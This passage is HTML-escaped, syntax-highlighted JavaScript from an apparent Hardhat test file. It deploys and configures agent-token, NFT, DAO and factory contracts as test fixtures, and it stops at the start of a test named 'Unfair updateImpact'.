console.log(`VirtualToken deployed at ${virtualToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ERC6551Registry Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tbaRegistry = await ethers.deployContract(\u0026quot;ERC6551Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await tbaRegistry.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deployed ERC6551Registry Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentNftV2...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const AgentNft = await ethers.getContractFactory(\u0026quot;AgentNftV2\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentNft = await upgrades.deployProxy(AgentNft, [deployer.address]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentNftV2 deployed at ${agentNft.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ContributionNft...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const contribution = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;ContributionNft\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [agentNft.target],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`ContributionNft deployed at ${contribution.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ServiceNft...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const service = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;ServiceNft\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [agentNft.target, contribution.target, process.env.DATASET_SHARES],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`ServiceNft deployed at ${service.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.setContributionService(contribution.target, service.target);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Set contribution and service on AgentNft\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Implementation contracts\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.deployContract(\u0026quot;AgentToken\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentToken deployed at ${agentToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentDAO...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentDAO = await ethers.deployContract(\u0026quot;AgentDAO\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentDAO.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentDAO deployed at ${agentDAO.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentVeToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentVeToken = await ethers.deployContract(\u0026quot;AgentVeToken\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentVeToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentVeToken deployed at ${agentVeToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentFactoryV2...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentFactory = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;AgentFactoryV2\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentVeToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentDAO.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tbaRegistry.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        PROPOSAL_THRESHOLD,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        deployer.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentFactoryV2 deployed at ${agentFactory.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.grantRole(await agentNft.MINTER_ROLE(), agentFactory.target);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Granted MINTER_ROLE to AgentFactory\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying Minter...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const minter = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;Minter\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        service.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contribution.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        1e12,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        20,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ipVault.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentFactory.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        deployer.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        1e10,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await minter.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Minter deployed at ${minter.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Setting parameters on AgentFactory...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setMaturityDuration(86400 * 365 * 10); // 10years\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setUniswapRouter(process.env.UNISWAP_ROUTER);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenAdmin(deployer.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenSupplyParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LP_SUPPLY,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_VAULT_SUPPLY,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.BOT_PROTECTION,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      minter.target\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenTaxParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.TAX,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.TAX,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.SWAP_THRESHOLD,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      treasury.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;AgentFactory parameters set\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { virtualToken, agentFactory, agentNft, minter, tbaRegistry, service };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployWithApplication() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await deployBaseContracts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentFactory, virtualToken, tbaRegistry } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Prepare tokens for proposal\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Minting VirtualToken for founder...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(founder.address, PROPOSAL_THRESHOLD);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(agentFactory.target, PROPOSAL_THRESHOLD);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econsole.log(\u0026quot;Proposing agent...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tx = await agentFactory\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .proposeAgent(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.name,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.symbol,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.tokenURI,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.cores,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.tbaSalt,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tbaRegistry.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.daoVotingPeriod,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.daoThreshold\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await tx.wait();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const filter = agentFactory.filters.NewApplication;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const events = await agentFactory.queryFilter(filter, -1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const event = events[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { id } = event.args;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Agent application created with ID: ${id}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { applicationId: id, ...base };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployWithAgent() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await deployWithApplication();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentFactory, applicationId } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Executing application...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .executeApplication(applicationId, false);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryFilter = agentFactory.filters.NewPersona;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryEvents = await agentFactory.queryFilter(factoryFilter, -1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryEvent = factoryEvents[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { virtualId, token, veToken, dao, tba, lp } = await factoryEvent.args;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Agent created with virtualId: ${virtualId}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ...base,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      agent: {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        token,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        veToken,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        dao,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tba,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        lp,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      },\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  before(async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Increase timeout for all tests\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    this.timeout(60000);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eit(\u0026quot;Unfair updateImpact\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agent, agentNft, virtualToken, service} = await loadFixture(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      deployWithAgent\u003c/span\u003e\u003c/span\u003e\n\u003cspan 